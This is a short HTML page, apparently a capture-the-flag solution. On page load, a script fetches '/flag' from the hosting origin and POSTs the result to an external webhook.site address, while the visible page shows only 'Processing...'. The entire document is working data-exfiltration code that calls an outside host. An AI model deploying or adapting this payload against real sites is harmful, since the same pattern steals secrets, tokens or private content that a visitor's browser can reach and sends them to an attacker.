<!DOCTYPE html>
<html>
<head>
    <script>
        // Extract flag from the response and send it to your webhook
        fetch('/flag')
            .then(response => response.text())
            .then(data => {
                fetch('https://webhook.site/cc42d0c8-c60f-4f93-a8fa-8e2b4bd6c5e5', {
                    method: 'POST',
                    body: data
                });
            });
    </script>
</head>
<body>
    <h1>Processing...</h1>
</body>
</html>
